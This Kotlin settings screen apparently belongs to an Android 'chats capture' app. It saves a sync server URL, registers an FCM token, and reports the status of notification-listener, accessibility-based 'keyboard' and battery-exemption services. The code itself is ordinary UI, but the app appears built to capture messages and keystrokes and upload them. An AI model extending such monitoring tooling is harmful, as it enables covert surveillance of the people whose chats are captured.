package com.chats.capture.ui.fragments

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.chats.capture.R
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.network.ApiClient
import com.chats.capture.utils.AppStateManager
import com.chats.capture.utils.FcmTokenManager
import com.chats.capture.utils.PermissionChecker
import com.google.firebase.messaging.FirebaseMessaging
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import timber.log.Timber

class SettingsFragment : Fragment() {
    
    private lateinit var editTextServerUrl: TextInputEditText
    private lateinit var buttonSaveServerUrl: MaterialButton
    private lateinit var textViewNotificationServiceStatus: android.widget.TextView
    private lateinit var textViewKeyboardServiceStatus: android.widget.TextView
    private lateinit var textViewBatteryOptimizationStatus: android.widget.TextView
    private lateinit var textViewLastSyncTime: android.widget.TextView
    private lateinit var textViewFcmStatus: android.widget.TextView
    private lateinit var textViewFcmToken: android.widget.TextView
    private lateinit var buttonOpenServiceSettings: MaterialButton
    private lateinit var buttonRefreshFcmToken: MaterialButton
    
    private lateinit var serviceMonitor: ServiceMonitor
    
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_settings, container, false)
    }
    
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        serviceMonitor = ServiceMonitor(requireContext())
        
        editTextServerUrl = view.findViewById(R.id.editTextServerUrl)
        buttonSaveServerUrl = view.findViewById(R.id.buttonSaveServerUrl)
        textViewNotificationServiceStatus = view.findViewById(R.id.textViewNotificationServiceStatus)
        textViewKeyboardServiceStatus = view.findViewById(R.id.textViewKeyboardServiceStatus)
        textViewBatteryOptimizationStatus = view.findViewById(R.id.textViewBatteryOptimizationStatus)
        textViewLastSyncTime = view.findViewById(R.id.textViewLastSyncTime)
        textViewFcmStatus = view.findViewById(R.id.textViewFcmStatus)
        textViewFcmToken = view.findViewById(R.id.textViewFcmToken)
        buttonOpenServiceSettings = view.findViewById(R.id.buttonOpenServiceSettings)
        buttonRefreshFcmToken = view.findViewById(R.id.buttonRefreshFcmToken)
        
        // Load saved server URL
        val prefs = requireContext().getSharedPreferences("capture_prefs", android.content.Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "")
        editTextServerUrl.setText(serverUrl)
        
        // Save server URL
        buttonSaveServerUrl.setOnClickListener {
            val url = editTextServerUrl.text?.toString() ?: ""
            if (url.isNotEmpty()) {
                prefs.edit().putString("server_url", url).apply()
                ApiClient.initialize(requireContext(), url)
                Timber.d("Server URL saved")
            }
        }
        
        // Open service settings
        buttonOpenServiceSettings.setOnClickListener {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
        }
        
        // Refresh FCM token
        buttonRefreshFcmToken.setOnClickListener {
            refreshFcmToken()
        }
        
        // Update service status
        updateServiceStatus()
    }
    
    private fun refreshFcmToken() {
        buttonRefreshFcmToken.isEnabled = false
        buttonRefreshFcmToken.text = "Refreshing..."
        
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            buttonRefreshFcmToken.isEnabled = true
            buttonRefreshFcmToken.text = "Refresh FCM Token"
            
            if (!task.isSuccessful) {
                Timber.e(task.exception, "Failed to get FCM token")
                updateServiceStatus()
                return@addOnCompleteListener
            }

            val token = task.result
            FcmTokenManager.saveToken(requireContext(), token)
            
            // Register device with new token
            val deviceRegistrationManager = DeviceRegistrationManager(requireContext())
            deviceRegistrationManager.registerDevice(token)
            
            Timber.d("FCM token refreshed")
            updateServiceStatus()
        }
    }
    
    override fun onResume() {
        super.onResume()
        updateServiceStatus()
    }
    
    private fun updateServiceStatus() {
        val status = PermissionChecker.getAllPermissionStatus(requireContext())
        
        textViewNotificationServiceStatus.text = "Notification Service: ${if (status.notificationService) "Enabled" else "Disabled"}"
        textViewKeyboardServiceStatus.text = "Keyboard Service: ${if (status.accessibilityService) "Enabled" else "Disabled"}"
        textViewBatteryOptimizationStatus.text = "Battery Optimization: ${if (status.batteryOptimization) "Ignored" else "Not Ignored"}"
        
        // Update last sync time
        val lastSyncTime = AppStateManager.getLastSyncTime(requireContext())
        val syncTimeText = if (lastSyncTime > 0) {
            val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
            "Last Sync: ${dateFormat.format(Date(lastSyncTime))}"
        } else {
            "Last Sync: Never"
        }
        textViewLastSyncTime.text = syncTimeText
        
        // Update colors based on status
        val enabledColor = requireContext().getColor(android.R.color.holo_green_dark)
        val disabledColor = requireContext().getColor(android.R.color.holo_red_dark)
        
        textViewNotificationServiceStatus.setTextColor(if (status.notificationService) enabledColor else disabledColor)
        textViewKeyboardServiceStatus.setTextColor(if (status.accessibilityService) enabledColor else disabledColor)
        textViewBatteryOptimizationStatus.setTextColor(if (status.batteryOptimization) enabledColor else disabledColor)
        
        // Update FCM status
        updateFcmStatus()
    }
    
    private fun updateFcmStatus() {
        val token = FcmTokenManager.getToken(requireContext())
        val tokenTimestamp = FcmTokenManager.getTokenTimestamp(requireContext())
        
        if (token != null) {
            textViewFcmStatus.text = "FCM Status: Active"
            textViewFcmStatus.setTextColor(requireContext().getColor(android.R.color.holo_green_dark))
            
            // Display token (truncated for security)
            val displayToken = if (token.length > 50) {
                "${token.take(25)}...${token.takeLast(25)}"
            } else {
                token
            }
            textViewFcmToken.text = "Token: $displayToken"
            
            // Show token age
            if (tokenTimestamp > 0) {
                val ageMinutes = (System.currentTimeMillis() - tokenTimestamp) / 60000
                textViewFcmToken.append(" (${ageMinutes}m ago)")
            }
        } else {
            textViewFcmStatus.text = "FCM Status: Not Available"
            textViewFcmStatus.setTextColor(requireContext().getColor(android.R.color.holo_red_dark))
            textViewFcmToken.text = "Token: Not available"
        }
    }
}
